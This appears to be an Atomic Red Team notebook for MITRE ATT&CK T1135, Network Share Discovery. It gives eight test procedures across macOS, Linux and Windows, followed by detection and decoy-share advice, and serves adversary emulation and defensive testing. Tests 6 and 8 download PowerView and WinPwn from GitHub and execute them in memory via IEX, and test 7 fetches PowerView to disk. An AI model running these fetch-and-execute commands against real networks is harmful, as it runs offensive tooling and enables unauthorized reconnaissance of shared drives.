{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "3361bb1d",
   "metadata": {},
   "source": "# T1135 - Network Share Discovery\nAdversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services."
  },
  {
   "cell_type": "markdown",
   "id": "5db82f4d",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "a0f7faee",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Network Share Discovery",
    "Network Share Discovery\n",
    "**Supported Platforms:** macos",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ndf -aH\nsmbutil view -g //computer1\nshowmount computer1\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59551247",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "ffbf9778",
   "metadata": {},
   "source": "### Atomic Test #2 - Network Share Discovery - linux\nNetwork Share Discovery using smbstatus\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: Package with smbstatus (samba) must exist on device\n\n##### Check Prereq Commands:\n```bash\nif (rpm -q samba &>/dev/null) || (dpkg -s samba | grep -q installed) > /dev/null; then exit 0; else exit 1; fi\n\n```\n##### Get Prereq Commands:\n```bash\nsudo (which yum && yum -y install epel-release samba)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y samba) \n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ecb21e1e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "1b5b03c1",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\nsudo smbstatus --shares\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "019f99aa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "d7544a39",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Network Share Discovery command prompt",
    "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution avalaible network shares will be displayed in the powershell session\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet view \\\\localhost\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bc36599e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "74b0e234",
   "metadata": {},
   "source": [
    "### Atomic Test #4 - Network Share Discovery PowerShell",
    "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nget-smbshare\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f60cce9d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "c6b2640e",
   "metadata": {},
   "source": [
    "### Atomic Test #5 - View available share drives",
    "View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet share\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3a56dfdd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "6d2454bb",
   "metadata": {},
   "source": "### Atomic Test #6 - Share Discovery with PowerView\nEnumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Endpoint must be joined to domain\n\n##### Check Prereq Commands:\n```powershell\nif ((Get-WmiObject -Class Win32_ComputerSystem).PartofDomain) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\n\"Join system to domain\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8f41adcc",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "3e0d646a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "55eeb4a2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "8afd0df9",
   "metadata": {},
   "source": "### Atomic Test #7 - PowerView ShareFinder\nPowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Invoke-ShareFinder module must exist in %TEMP% directory\n##### Check Prereq Commands:\n```powershell\nif (Test-Path $env:TEMP\\PowerView.ps1) {exit 0} else {exit 1}\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile $env:TEMP\\PowerView.ps1\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "414bd124",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "50baee2b",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nImport-Module $env:TEMP\\PowerView.ps1\nInvoke-ShareFinder -CheckShareAccess\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1a6d38ee",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "f89b9b73",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - WinPwn - shareenumeration",
    "Network share enumeration using the shareenumeration function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nshareenumeration -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bda52a19",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1135 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "87e3ecdc",
   "metadata": {},
   "source": "## Detection\nSystem and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001)."
  },
  {
   "cell_type": "markdown",
   "id": "576a4e4a",
   "metadata": {},
   "source": "\n## Shield Active Defense\n### Decoy Content  \n Seed content that can be used to lead an adversary in a specific direction, entice a behavior, etc. \n\n Decoy Content is the data used to tell a story to an adversary. This content can be legitimate or synthetic data which is used to reinforce or validate your defensive strategy. Examples of decoy content are files on a storage object, entries in the system registry, system shortcuts, etc.\n#### Opportunity\nIn an adversary engagement scenario, there is an opportunity to introduce decoy content to entice additional engagement activity.\n#### Use Case\nA defender can utilize decoy network shares to provide content that could be used by the adversary. \n#### Procedures\nCreate directories and files with names and contents using key words that may be relevant to an adversary to see if they examine or exfiltrate the data.\nSeed a file system with content that is of no value to the company but reinforces the legitimacy of the system if viewed by an adversary.\n"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "PowerShell",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "PowerShell",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}